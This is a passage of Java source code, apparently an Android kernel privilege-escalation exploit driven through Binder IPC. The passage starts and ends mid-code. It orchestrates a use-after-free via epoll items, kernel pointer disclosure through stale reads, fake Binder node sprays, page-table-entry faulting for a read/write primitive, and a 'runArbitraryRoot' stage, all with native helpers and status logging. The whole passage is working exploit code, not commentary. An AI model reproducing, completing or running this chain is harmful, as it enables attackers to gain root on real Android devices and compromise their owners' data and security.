                if (service.transact(OwnerService.TRANSACTION_STATE,
                                     data, reply, 0)) {
                    reply.readException();
                    int held = reply.readInt();
                    if (held > 0) {
                        return held;
                    }
                }
            } finally {
                reply.recycle();
                data.recycle();
            }
            Thread.sleep(10);
        }
        return 0;
    }

    private String fetchAndValidateCohort(IBinder service) throws Exception {
        IBinder calibration = fetchCalibrationBinder(service);
        if (calibration == null) {
            return "status=fail stage=cohort reason=calibration";
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!service.transact(OwnerService.TRANSACTION_COHORT,
                                  data, reply, 0)) {
                return "status=fail stage=cohort reason=transaction";
            }
            reply.readException();
            int count = reply.readInt();
            int ownerCpu = reply.readInt();
            cohortOwnerCpu = ownerCpu;
            if (count != OwnerService.COHORT_SIZE) {
                return "status=fail stage=cohort reason=count count=" + count;
            }
            cohort = new IBinder[count];
            long[] pointers = new long[count];
            long[] cookies = new long[count];
            cohortPointers = pointers;
            cohortCookies = cookies;
            for (int index = 0; index < count; index++) {
                cohort[index] = reply.readStrongBinder();
            }
            fetchCohortTokens(service, pointers, cookies);
            return NativeBridge.validateCohort(
                    calibration, cohort, pointers, cookies, ownerCpu);
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private IBinder fetchCalibrationBinder(IBinder service) throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!service.transact(OwnerService.TRANSACTION_CALIBRATION,
                                  data, reply, 0)) {
                return null;
            }
            reply.readException();
            return reply.readStrongBinder();
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private void fetchCohortTokens(IBinder service, long[] pointers,
                                   long[] cookies) throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!service.transact(OwnerService.TRANSACTION_COHORT_TOKENS,
                                  data, reply, 0)) {
                throw new IllegalStateException("cohort-token-transaction");
            }
            reply.readException();
            int count = reply.readInt();
            if (count != pointers.length || count != cookies.length) {
                throw new IllegalStateException("cohort-token-count");
            }
            for (int index = 0; index < count; index++) {
                pointers[index] = reply.readLong();
                cookies[index] = reply.readLong();
            }
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private int readSelectedHeld(IBinder service) throws Exception {
        for (int attempt = 0; attempt < 100; attempt++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                if (service.transact(OwnerService.TRANSACTION_STATE,
                                     data, reply, 0)) {
                    reply.readException();
                    reply.readInt();
                    int selected = reply.readInt();
                    if (selected > 0) {
                        return selected;
                    }
                }
            } finally {
                reply.recycle();
                data.recycle();
            }
            Thread.sleep(10);
        }
        return 0;
    }

    private String transactForString(IBinder service, int code)
            throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!service.transact(code, data, reply, 0)) {
                return "status=fail reason=transaction code=" + code;
            }
            reply.readException();
            return reply.readString();
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private void commitRwProbe() {
        String result;
        try {
            String retire = NativeBridge.retireCohort(
                    cohortPointers[OwnerService.SELECTED_INDEX],
                    cohortCookies[OwnerService.SELECTED_INDEX]);
            if (!retire.startsWith("status=pass")) {
                result = "status=fail stage=rw-commit retire=[" + retire + "]";
            } else {
                String fault = transactForString(ownerService,
                        OwnerService.TRANSACTION_FAULT_PTES);
                String check = fault.startsWith("status=pass")
                        ? transactForString(ownerService,
                                OwnerService.TRANSACTION_TRIGGER_CHECK)
                        : "status=fail stage=pte-check reason=fault";
                StringBuilder checks = new StringBuilder(check);
                for (int attempt = 1; attempt < 4 &&
                        !check.startsWith("status=pass") &&
                        !check.contains("readable=16384"); attempt++) {
                    check = transactForString(ownerService,
                            OwnerService.TRANSACTION_TRIGGER_CHECK);
                    checks.append(" | ").append(check);
                }
                boolean pass = fault.startsWith("status=pass") &&
                        check.startsWith("status=pass");
                result = "status=" + (pass ? "pass" : "miss") +
                        " stage=rw-commit retire=[" + retire +
                        "] fault=[" + fault + "] checks=[" + checks + "]";
            }
        } catch (Exception exception) {
            result = "status=fail stage=rw-commit reason=exception type=" +
                    exception.getClass().getSimpleName();
        }
        publish(result);
        commitRunning.set(false);
    }

    private void runEpitemLeak(String handleState) {
        String result;
        try {
            checkpoint("epitem-start");
            if ("chain-addresses".equals(requestedStage) || isRootFlow()) {
                startService(new Intent(this, SecondOwnerWarmService.class));
                startService(new Intent(this, SecondClientWarmService.class));
            }
            Intent batchClient = new Intent(this,
                    ("chain-addresses".equals(requestedStage) ||
                     isRootFlow())
                            ? BatchClient2Service.class
                            : BatchClientService.class);
            if (useMixedDisclosure()) {
                boolean chainProbe =
                        "chain-addresses".equals(requestedStage);
                if (ownerService == null ||
                        !fetchFillerNodes(ownerService) ||
                        (chainProbe &&
                                !fetchControlledNode(ownerService))) {
                    throw new IllegalStateException(
                            "mixed-owner-objects");
                }
                if (chainProbe) {
                    chainControlledState =
                            NativeBridge.cacheControlledHandle(
                                    controlledNode);
                    if (!chainControlledState.startsWith("status=pass")) {
                        throw new IllegalStateException(
                                "mixed-controlled-handle");
                    }
                }
            }
            if (!startEpitemBatchClient(batchClient)) {
                throw new IllegalStateException("epitem-client-death-arm");
            }
            File ready = new File(getFilesDir(), "epitem-leak.unread-ready");
            File leak = new File(getFilesDir(), "epitem-leak.result");
            waitForEither(ready, leak, 120000);
            checkpoint(ready.exists()
                    ? "epitem-reader-ready" : "epitem-reader-failed");
            if (!ready.exists()) {
                result = readSmall(leak);
            } else if (useMixedDisclosure()) {
                result = runMixedDisclosure(handleState, leak);
            } else {
                String reclaim = NativeBridge.reclaimWithEpitems(
                        getFilesDir().getAbsolutePath());
                checkpoint(reclaim.startsWith("status=pass")
                        ? "epitem-reclaim-pass" : "epitem-reclaim-failed");
                if (!reclaim.startsWith("status=pass")) {
                    result = "status=fail stage=epitem-leak handle=[" +
                            handleState + "] reclaim=[" + reclaim + "]";
                } else {
                    waitForEither(leak, null, 120000);
                    String leakState = readSmall(leak);
                    String analysis = leakState.startsWith("status=pass")
                            ? NativeBridge.analyseEpitemLeak(
                                    getFilesDir().getAbsolutePath())
                            : "status=miss stage=epitem-analysis " +
                                    "reason=transport";
                    checkpoint(analysis.startsWith("status=pass")
                            ? "epitem-analysis-pass"
                            : "epitem-analysis-failed");
                    result = "status=" +
                            (leakState.startsWith("status=pass") &&
                             analysis.startsWith("status=pass")
                                    ? "pass" : "miss") +
                            " stage=epitem-leak handle=[" + handleState +
                            "] reclaim=[" + reclaim + "] leak=[" +
                            leakState + "] analysis=[" + analysis + "]";
                }
            }
        } catch (Exception exception) {
            result = "status=fail stage=epitem-leak reason=exception type=" +
                    exception.getClass().getSimpleName() + " message=" +
                    safeCheckpointToken(exception.getMessage());
        }
        if ("chain-addresses".equals(requestedStage) ||
                isRootFlow()) {
            if (useMixedDisclosure()) {
                publish(result);
                if (!isRootFlow() ||
                        "primitive-probe".equals(requestedStage) ||
                        (!result.startsWith("status=pass") &&
                                !kernelMutationStarted)) {
                    finishEpitemLeak();
                }
                return;
            }
            if (result.startsWith("status=pass")) {
                Log.i(TAG, result);
                continueChainWithNode(result);
            } else {
                publish("status=miss stage=" + requestedStage +
                        " epitem=[" +
                        result + "]");
                finishEpitemLeak();
            }
            return;
        }
        publish(result);
        finishEpitemLeak();
    }

    private String runMixedDisclosure(String handleState, File leak)
            throws Exception {
        checkpoint("mixed-disclosure-start");
        boolean root = isRootFlow();
        boolean rootTopology = root ||
                "chain-addresses".equals(requestedStage);
        String targetState = "status=pass stage=raw-target skipped=1";
        String clientState = "status=pass stage=raw-client skipped=1";
        if (rootTopology) {
            writePrivate("controlled-reader.request",
                    "status=requested stage=fake-node-check");
            writePrivate("raw-target.multi-export",
                    "status=ready stage=raw-cohort-export");
            writePrivate("raw-target.deferred-export",
                    "status=ready clients=" + RAW_VICTIM_COUNT);
        }

        String prime = "status=pass stage=raw-binder-holder-prime skipped=1";
        rawBinderHolderBootstrapState =
                "status=pass stage=raw-binder-holder-bootstrap deferred=1";

        String predrain = NativeBridge.prepareMixedEpitemReclaim(
                getFilesDir().getAbsolutePath());
        checkpoint(predrain.startsWith("status=pass")
                ? "mixed-predrain-pass" : "mixed-predrain-failed");
        if (!predrain.startsWith("status=pass")) {
            return "status=miss stage=mixed-disclosure predrain=[" +
                    predrain + "]";
        }
        String decrementFirst = NativeBridge.decrementNodeBatchRange(
                getFilesDir().getAbsolutePath(), 0, 1024, true);
        String decrement = decrementFirst;
        checkpoint(decrement.startsWith("status=pass")
                ? "mixed-decrement-pass" : "mixed-decrement-failed");
        if (!decrement.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure decrement=[" +
                    decrement + "]";
        }
        String early = NativeBridge.beginMixedEpitemReclaim();
        checkpoint(early.startsWith("status=pass")
                ? "mixed-epitem-early-pass" : "mixed-epitem-early-failed");
        if (!early.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure early=[" + early + "]";
        }
        String earlyEpitems = NativeBridge.extendMixedEpitemReclaim(4096);
        if (!earlyEpitems.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure early_epitems=[" +
                    earlyEpitems + "]";
        }
        if (rootTopology) {
            targetState = prepareRawTarget();
            clientState = targetState.startsWith("status=pass")
                    ? prepareRawClient()
                    : "status=fail stage=raw-client reason=target";
        }
        if (!targetState.startsWith("status=pass") ||
                !clientState.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure target=[" +
                    targetState + "] client=[" + clientState + "]";
        }
        rawBinderHolderBootstrapState = prepareRawBinderHolders();
        if (!rawBinderHolderBootstrapState.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure bootstrap=[" +
                    rawBinderHolderBootstrapState + "]";
        }
        String rawExport = rootTopology
                ? exportRawControlledNode()
                : "status=pass stage=raw-controlled-export skipped=1";
        if (rootTopology && rawExport.startsWith("status=pass")) {
            controlledPointer = rawControlledPointer;
            controlledCookie = rawControlledCookie;
        }
        if (!rawExport.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure export=[" +
                    rawExport + "]";
        }
        String decrementSecond = NativeBridge.decrementNodeBatchRange(
                getFilesDir().getAbsolutePath(), 1024, 128, false);
        decrement = decrementFirst + " second=[" + decrementSecond + "]";
        if (!decrementSecond.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure decrement_second=[" +
                    decrementSecond + "]";
        }
        String latePrime =
                "status=pass stage=raw-binder-holder-prime skipped=1";
        String primeRelease = "status=pass" +
                " stage=raw-binder-holder-handle-release skipped=1";
        String binderWindow =
                "status=pass stage=mixed-binder-window skipped=1";

        String refs = rawExport.startsWith("status=pass")
                ? rootTopology
                        ? retainRawRootBinderHolderRefs(true)
                        : retainRawBinderHolderRefs(true)
                : "status=fail stage=raw-binder-refs reason=export";
        if (!refs.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure refs=[" + refs + "]";
        }

        String currentProcMarker = rootTopology
                ? retainRawCurrentProcMarkerPhase()
                : "status=pass stage=raw-current-proc-marker skipped=1";
        if (!currentProcMarker.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure marker=[" +
                    currentProcMarker + "]";
        }

        String lateEpitems =
                "status=pass stage=mixed-shared-epitem-extend skipped=1";

        String epitems = NativeBridge.completeMixedEpitemReclaim();
        String enabled = epitems.startsWith("status=pass")
                ? NativeBridge.enableStaleRead(
                        getFilesDir().getAbsolutePath())
                : "status=fail stage=stale-read-enable reason=epitems";
        checkpoint(enabled.startsWith("status=pass")
                ? "mixed-read-enable-pass" : "mixed-read-enable-failed");
        if (!enabled.startsWith("status=pass")) {
            NativeBridge.discardMixedEpitemReclaim();
            return "status=miss stage=mixed-disclosure epitems=[" +
                    epitems + "] enabled=[" + enabled + "]";
        }

        waitForEither(leak, null, 120000);
        String leakState = readSmall(leak);
        boolean leakTransport = validMixedLeakTransport(leakState);
        String nodeAnalysis = leakTransport
                ? NativeBridge.analyseBinderRefLeak(
                        getFilesDir().getAbsolutePath())
                : "status=miss stage=binder-ref-leak reason=transport";
        String epitemAnalysis = leakTransport
                ? NativeBridge.analyseEpitemLeak(
                        getFilesDir().getAbsolutePath())
                : "status=miss stage=epitem-analysis reason=transport";
        boolean disclosed = nodeAnalysis.startsWith("status=pass") &&
                epitemAnalysis.startsWith("status=pass");
        if (disclosed && rootTopology) {
            String referenceRelease =
                    NativeBridge.releaseRawBinderHolderHandles(
                            RAW_BINDER_HOLDER_COUNT +
                                    RAW_CURRENT_PROC_MARKER_HOLDERS,
                            RAW_CURRENT_PROC_MARKER_HOLDERS);
            String anchorPhase = referenceRelease.startsWith("status=pass")
                    ? retainRawRootKernelAnchorPhase()
                    : "status=fail stage=raw-root-anchor-phase " +
                            "reason=reference-release";
            String anchor = anchorPhase.startsWith("status=pass")
                    ? retainKernelAnchor(RAW_BINDER_HOLDER_COUNT)
                    : "status=fail stage=anchor-retain reason=phase";
            refs = anchor.startsWith("status=pass")
                    ? refs + " reference_release=[" + referenceRelease +
                            "] anchor_phase=[" + anchorPhase +
                            "] anchor=[" + anchor + "]"
                    : "status=fail stage=raw-binder-refs " +
                            "reference_release=[" + referenceRelease +
                            "] anchor_phase=[" + anchorPhase +
                            "] anchor=[" + anchor + "]";
            disclosed = refs.startsWith("status=pass");
        }
        checkpoint(disclosed
                ? "mixed-analysis-pass" : "mixed-analysis-failed");
        writePrivate("binder-ref.analysis", nodeAnalysis);
        writePrivate("epitem-leaks.bin.analysis", epitemAnalysis);
        String disclosure = "status=" + (disclosed ? "pass" : "miss") +
                " stage=mixed-disclosure handle=[" + handleState +
                "] target=[" + targetState + "] client=[" + clientState +
                "] bootstrap=[" + rawBinderHolderBootstrapState +
                "] prime=[" + prime + "] decrement=[" + decrement +
                "] predrain=[" + predrain + "] early=[" + early +
                "] early_epitems=[" + earlyEpitems +
                "] late_prime=[" + latePrime +
                "] prime_release=[" + primeRelease +
                "] binder_window=[" + binderWindow + "] export=[" + rawExport +
                "] refs=[" + refs + "] current_proc_marker=[" +
                currentProcMarker + "] late_epitems=[" + lateEpitems +
                "] epitems=[" + epitems +
                "] leak=[" + leakState + "] node=[" + nodeAnalysis +
                "] epitem=[" + epitemAnalysis + "]";
        if (!disclosed || !root) {
            String release = releaseRawBinderHolders();
            return "status=" +
                    (disclosed && release.startsWith("status=pass")
                            ? "pass" : "miss") +
                    " stage=mixed-disclosure-gate disclosure=[" +
                    disclosure + "] release=[" + release + "]";
        }
        return runArbitraryRoot(
                handleState + " mixed=[" + disclosure + "]",
                decrement, refs, nodeAnalysis);
    }

    private boolean validMixedLeakTransport(String state) {
        int canonicalPairs = parseIntField(state, "canonical_pairs=");
        int originalPairs = parseIntField(state, "original_pairs=");
        int kernelValues = parseIntField(state, "kernel_values=");
        int densePages = parseIntField(state, "dense_pages=");
        return state.matches(
                "^status=(?:pass|miss) stage=epitem-leak .*") &&
                state.contains(" received=1152 expected=1152 ") &&
                canonicalPairs >= 0 && originalPairs >= 0 &&
                canonicalPairs + originalPairs > 0 &&
                kernelValues >= 16 && densePages > 0 &&
                state.contains(" end=1 binary=1 stale_buffers_freed=0");
    }

    private boolean startEpitemBatchClient(Intent intent) throws Exception {
        CountDownLatch connected = new CountDownLatch(1);
        IBinder[] service = new IBinder[1];
        ServiceConnection connection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name,
                                           IBinder binder) {
                service[0] = binder;
                connected.countDown();
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
            }
        };
        if (!bindService(intent, connection, Context.BIND_AUTO_CREATE) ||
                !connected.await(5, TimeUnit.SECONDS) ||
                service[0] == null) {
            return false;
        }
        long barrier = NativeBridge.armBinderDeathBarrier(service[0]);
        if (barrier == 0) {
            unbindService(connection);
            return false;
        }
        if (startService(intent) == null) {
            NativeBridge.discardBinderDeathBarrier(barrier);
            unbindService(connection);
            return false;
        }
        new Thread(() -> {
            String death = NativeBridge.awaitBinderDeathBarrier(
                    barrier, 120000);
            try {
                unbindService(connection);
            } catch (Exception ignored) {
            }
            try {
                writePrivateAtomic("epitem-client.death-ready", death);
            } catch (Exception exception) {
                Log.e(TAG, "epitem-client-death", exception);
            }
        }, "epitem-client-death").start();
        return true;
    }

    private void continueChainWithNode(String epitemResult) {
        checkpoint("first-owner-cleanup-start");
        boolean rawHolderCandidate = RAW_BINDER_HOLDER_CANDIDATE &&
                ("chain-addresses".equals(requestedStage) || isRootFlow());
        FutureTask<String> holderBootstrap = rawHolderCandidate
                ? new FutureTask<>(this::prepareRawBinderHolders) : null;
        if (holderBootstrap != null) {
            new Thread(holderBootstrap,
                    "raw-binder-holder-bootstrap").start();
        }
        try {
            writePrivate("owner-fragments-cleanup.request",
                    "status=requested");
            writePrivate("blockers-reset.request", "status=requested");
            File cleanupReady = new File(getFilesDir(),
                    "owner-fragments-cleanup.ready");
            waitForEither(cleanupReady, null, 30000);
            if (!readSmall(cleanupReady).startsWith("status=pass")) {
                throw new IllegalStateException("fragment-cleanup");
            }
            File resetReady = new File(getFilesDir(),
                    "blockers-reset.ready");
            waitForEither(resetReady, null, 30000);
            if (!readSmall(resetReady).startsWith("status=pass")) {
                throw new IllegalStateException("blocker-reset");
            }
        } catch (Exception exception) {
            if (holderBootstrap != null) {
                try {
                    holderBootstrap.get(6, TimeUnit.SECONDS);
                } catch (Exception ignored) {
                }
            }
            publish("status=fail stage=" + requestedStage + " epitem=[" +
                    epitemResult + "] reason=first-owner-reset");
            finishEpitemLeak();
            return;
        }
        clearEpitemLeakFiles();
        chainAddressPrefix = "epitem=[" + epitemResult + "] ";
        if (rawHolderCandidate) {
            try {
                rawBinderHolderBootstrapState = holderBootstrap.get(
                        6, TimeUnit.SECONDS);
            } catch (InterruptedException exception) {
                Thread.currentThread().interrupt();
                rawBinderHolderBootstrapState = "status=fail" +
                        " stage=raw-binder-holder-bootstrap" +
                        " reason=interrupted";
            } catch (ExecutionException | TimeoutException exception) {
                rawBinderHolderBootstrapState = "status=fail" +
                        " stage=raw-binder-holder-bootstrap reason=" +
                        exception.getClass().getSimpleName();
            }
            if (!rawBinderHolderBootstrapState.startsWith("status=pass")) {
                publish("status=fail stage=chain-addresses " +
                        chainAddressPrefix + "holder_bootstrap=[" +
                        rawBinderHolderBootstrapState + "]");
                finishEpitemLeak();
                return;
            }
        }
        checkpoint("second-owner-bind-start");
        try {
            unbindService(connection);
            ownerConnectionBound = false;
        } catch (Exception ignored) {
        }
        stopService(new Intent(this, OwnerService.class));
        ownerService = null;
        ownerServicePid = -1;
        chainSecondOwner = true;
        Intent secondOwner = new Intent(this, OwnerService2.class)
                .putExtra(OwnerService.EXTRA_NONCE, rootWatchdogNonce)
                .putExtra(OwnerService.EXTRA_BOOT_ID, rootWatchdogBootId)
                .putExtra(OwnerService.EXTRA_TERMINAL_CLEANUP,
                        directTerminalCleanup);
        chainEpitemBound = bindService(
                secondOwner,
                chainEpitemConnection, Context.BIND_AUTO_CREATE);
        if (!chainEpitemBound) {
            publish("status=fail stage=" + requestedStage + " " +
                    chainAddressPrefix + "reason=node-owner-bind");
            finishEpitemLeak();
        }
    }

    private boolean unbindMainRawClientConnection(
            ServiceConnection expected) {
        ServiceConnection toUnbind;
        synchronized (this) {
            long deadline = SystemClock.elapsedRealtime() + 5000;
            while (rawClientUnbinding &&
                    rawClientConnection == expected) {
                long remaining = deadline - SystemClock.elapsedRealtime();
                if (remaining <= 0) {
                    return false;
                }
                try {
                    wait(Math.min(20, remaining));
                } catch (InterruptedException exception) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
            if (rawClientConnection == null && !rawClientBound &&
                    !rawClientUnbinding) {
                return true;
            }
            if (rawClientConnection != expected) {
                return false;
            }
            if (rawClientUnbinding) {
                return true;
            }
            if (!rawClientBound) {
                return false;
            }
            rawClientUnbinding = true;
            toUnbind = rawClientConnection;
        }
        boolean unbound = false;
        try {
            unbindService(toUnbind);
            unbound = true;
            return true;
        } catch (Exception exception) {
            return false;
        } finally {
            synchronized (this) {
                if (rawClientConnection == toUnbind) {
                    if (unbound) {
                        rawClientBound = false;
                        rawClientConnection = null;
                        rawClientService = null;
                    } else {
                        rawClientConnectionFailed = true;
                    }
                    rawClientUnbinding = false;
                    notifyAll();
                }
            }
        }
    }

    private boolean unbindExtraRawClientSlot(RawClientSlot slot,
                                             ServiceConnection expected) {
        ServiceConnection toUnbind;
        synchronized (extraRawClientLock) {
            long deadline = SystemClock.elapsedRealtime() + 5000;
            while (slot.unbinding && slot.connection == expected) {
                long remaining = deadline - SystemClock.elapsedRealtime();
                if (remaining <= 0) {
                    return false;
                }
                try {
                    extraRawClientLock.wait(Math.min(20, remaining));
                } catch (InterruptedException exception) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
            if (slot.connection == null && !slot.bound) {
                return true;
            }
            if (slot.connection != expected || !slot.bound) {
                return false;
            }
            slot.unbinding = true;
            toUnbind = slot.connection;
        }
        boolean unbound = false;
        try {
            unbindService(toUnbind);
            unbound = true;
            return true;
        } catch (Exception exception) {
            return false;
        } finally {
            synchronized (extraRawClientLock) {
                if (slot.connection == toUnbind) {
                    if (unbound) {
                        slot.connection = null;
                        slot.service = null;
                        slot.bound = false;
                    } else {
                        slot.state = RawClientSlotState.FAILED;
                    }
                    slot.unbinding = false;
                }
                extraRawClientLock.notifyAll();
            }
        }
    }

    private void resetExtraRawClientSlot(RawClientSlot slot,
                                         boolean clearTokens) {
        long deathBarrier;
        synchronized (extraRawClientLock) {
            deathBarrier = slot.deathBarrier;
            slot.deathBarrier = 0;
            slot.connection = null;
            slot.service = null;
            slot.identity = null;
            slot.pid = -1;
            slot.bound = false;
            slot.unbinding = false;
            slot.connectedOnce = false;
            slot.state = RawClientSlotState.EMPTY;
            if (clearTokens) {
                slot.pointer = 0;
                slot.cookie = 0;
            }
        }
        if (deathBarrier != 0) {
            NativeBridge.discardBinderDeathBarrier(deathBarrier);
        }
    }

    private void releaseExtraRawClientSlots(boolean clearTokens) {
        for (RawClientSlot slot : extraRawClientSlots) {
            ServiceConnection slotConnection;
            synchronized (extraRawClientLock) {
                slotConnection = slot.connection;
            }
            boolean released = slotConnection == null ||
                    unbindExtraRawClientSlot(slot, slotConnection);
            synchronized (extraRawClientLock) {
                if (released && slot.connection == null && !slot.bound &&
                        !slot.unbinding) {
                    resetExtraRawClientSlot(slot, clearTokens);
                } else {
                    slot.state = RawClientSlotState.FAILED;
                }
            }
        }
    }

    private void finishEpitemLeak() {
        if (processTeardownRequired) {
            return;
        }
        if (kernelMutationStarted &&
                (isRootFlow() ||
                 "fake-node-check".equals(requestedStage))) {
            checkpoint(isRootFlow()
                    ? "root-window-reboot-required"
                    : "primitive-reboot-required");
            return;
        }
        NativeBridge.releaseFakeNodeSpray();
        String rawHolderRelease = releaseRawBinderHolders();
        if (!rawHolderRelease.startsWith("status=pass")) {
            Log.e(TAG, rawHolderRelease);
        }
        releaseIsolatedConnections();
        try {
            waitForIsolatedExit(5000);
        } catch (Exception ignored) {
        }
        discardIsolatedDeathBarriers();
        synchronized (isolatedPids) {
            isolatedPids.clear();
        }
        abortRawClient();
        ServiceConnection mainConnection;
        synchronized (this) {
            mainConnection = rawClientConnection;
        }
        if (mainConnection != null) {
            unbindMainRawClientConnection(mainConnection);
        }
        synchronized (this) {
            rawClientService = null;
            rawClientPid = -1;
            rawClientProcessIdentity = null;
            rawClientUnbinding = false;
            rawClientConnectedOnce = false;
            rawClientRetiring = false;
        }
        releaseExtraRawClientSlots(true);
        if (rawTargetConnection != null) {
            try {
                unbindService(rawTargetConnection);
            } catch (Exception ignored) {
            }
            rawTargetConnection = null;
            rawTargetService = null;
        }
        if (anchorHolderConnection != null) {
            try {
                unbindService(anchorHolderConnection);
            } catch (Exception ignored) {
            }
            anchorHolderConnection = null;
            anchorHolderService = null;
            anchorHolderPid = -1;
        }
        try {
            if (ownerConnectionBound) {
                unbindService(connection);
                ownerConnectionBound = false;
            }
        } catch (Exception ignored) {
        }
        if (chainEpitemBound) {
            try {
                unbindService(chainEpitemConnection);
            } catch (Exception ignored) {
            }
            chainEpitemBound = false;
        }
        ownerService = null;
        ownerServicePid = -1;
        stopForeground(true);
        stopSelf();
    }

    private int releaseIsolatedConnections() {
        return releaseIsolatedConnections(-1);
    }

    private int releaseIsolatedConnections(int expectedCount) {
        List<ServiceConnection> toRelease;
        synchronized (isolatedConnections) {
            if (expectedCount >= 0 &&
                    isolatedConnections.size() != expectedCount) {
                return -1;
            }
            Set<ServiceConnection> unique = Collections.newSetFromMap(
                    new IdentityHashMap<>());
            for (ServiceConnection isolated : isolatedConnections) {
                if (isolated == null || !unique.add(isolated)) {
                    return -1;
                }
            }
            toRelease = new ArrayList<>(isolatedConnections);
            isolatedConnections.clear();
        }
        int released = 0;
        for (ServiceConnection isolated : toRelease) {
            try {
                unbindService(isolated);
                released++;
            } catch (Exception ignored) {
            }
        }
        return released;
    }

    private void discardIsolatedDeathBarriers() {
        for (IsolatedControllerPair pair : isolatedControllerPairs) {
            if (pair != null && pair.deathBarrier != 0) {
                NativeBridge.discardBinderDeathBarrier(pair.deathBarrier);
                pair.deathBarrier = 0;
            }
        }
        isolatedControllerPairs = Collections.emptyList();
    }

    private String proveIsolatedRetirementBeforeMutation()
            throws Exception {
        List<IsolatedControllerPair> pairs = Collections.unmodifiableList(
                new ArrayList<>(isolatedControllerPairs));
        if (pairs.size() != 64) {
            return "status=fail stage=isolated-retirement-proof " +
                    "reason=pairs count=" + pairs.size() +
                    " unbound=0";
        }
        Set<IBinder> controllers = new HashSet<>();
        Set<Integer> pairPids = new HashSet<>();
        int callerPid = Process.myPid();
        for (IsolatedControllerPair pair : pairs) {
            if (pair == null || pair.controller == null || pair.pid <= 0 ||
                    pair.deathBarrier == 0 ||
                    pair.pid == callerPid || !controllers.add(pair.controller) ||
                    !pairPids.add(pair.pid)) {
                return "status=fail stage=isolated-retirement-proof " +
                        "reason=pairs unbound=0";
            }
        }
        int[] snapshot;
        synchronized (isolatedPids) {
            if (isolatedPids.size() != 64 ||
                    !pairPids.equals(isolatedPids)) {
                return "status=fail stage=isolated-retirement-proof " +
                        "reason=pid-set total=" + isolatedPids.size() +
                        " unbound=0";
            }
            snapshot = new int[64];
            int index = 0;
            for (int pid : isolatedPids) {
                snapshot[index++] = pid;
            }
        }
        int unbound = releaseIsolatedConnections(64);
        if (unbound != 64) {
            return "status=fail stage=isolated-retirement-proof " +
                    "reason=unbind unbound=" + unbound;
        }
        long deathDeadline = SystemClock.elapsedRealtime() +
                TERMINAL_RETIREMENT_TIMEOUT_MS;
        int deathPassed = 0;
        for (IsolatedControllerPair pair : pairs) {
            long remaining = deathDeadline - SystemClock.elapsedRealtime();
            String death = NativeBridge.awaitBinderDeathBarrier(
                    pair.deathBarrier,
                    (int) Math.max(1, Math.min(Integer.MAX_VALUE, remaining)));
            pair.deathBarrier = 0;
            if (death.startsWith("status=pass")) {
                deathPassed++;
            }
        }
        if (deathPassed != 64) {
            return "status=fail stage=isolated-retirement-proof " +
                    "reason=binder-death death_passed=" + deathPassed +
                    " unbound=" + unbound;
        }
        String proof = NativeBridge.proveIsolatedProcessesRetired(
                isolatedRetirementGeneration, snapshot, unbound,
                TERMINAL_RETIREMENT_TIMEOUT_MS);
        String diagnostic = proof + " unbound=" + unbound +
                " death_passed=" + deathPassed;
        if (proof.startsWith("status=pass")) {
            isolatedControllerPairs = Collections.emptyList();
            synchronized (isolatedPids) {
                isolatedPids.clear();
            }
        }
        return diagnostic;
    }

    private void retireTerminalJavaObjects() throws Exception {
        terminalJavaRetirementStage = "identity-preflight";
        terminalJavaRetirementInProgress = true;
        ProcessIdentity terminalRawTarget = rawTargetProcessIdentity;
        ProcessIdentity terminalOwner = ownerProcessIdentity;
        IBinder terminalRawTargetService = rawTargetService;
        IBinder terminalOwnerService = ownerService;
        IBinder terminalAnchorService = anchorHolderService;
        ProcessIdentity terminalMainClient;
        IBinder terminalMainService;
        ServiceConnection terminalMainConnection;
        List<ProcessIdentity> liveIdentities = new ArrayList<>();
        IdentityHashMap<ProcessIdentity, String> retirementRoles =
                new IdentityHashMap<>();
        List<RawClientSlot> liveExtraSlots = new ArrayList<>();
        addRetirementIdentity(liveIdentities, rawTargetProcessIdentity,
                "raw-target");
        retirementRoles.put(rawTargetProcessIdentity, "raw-target");
        addRetirementIdentity(liveIdentities, anchorHolderProcessIdentity,
                "anchor");
        retirementRoles.put(anchorHolderProcessIdentity, "anchor");
        addRetirementIdentity(liveIdentities, ownerProcessIdentity,
                "owner");
        retirementRoles.put(ownerProcessIdentity, "owner");
        synchronized (this) {
            terminalMainClient = rawClientProcessIdentity;
            terminalMainService = rawClientService;
            terminalMainConnection = rawClientConnection;
            if (terminalMainClient == null || terminalMainService == null ||
                    terminalMainConnection == null || !rawClientBound ||
                    rawClientUnbinding || rawClientRetiring ||
                    rawClientPid != terminalMainClient.pid ||
                    rawClientConnectionFailed ||
                    !isOriginalIdentityLive(terminalMainClient)) {
                throw new IllegalStateException(
                        "terminal-main-client-state");
            }
        }
        ProcessIdentity observedMain = queryServiceIdentity(
                terminalMainService,
                RawBClientService.TRANSACTION_IDENTITY);
        if (observedMain == null ||
                observedMain.pid != terminalMainClient.pid ||
                observedMain.startTime != terminalMainClient.startTime) {
            throw new IllegalStateException(
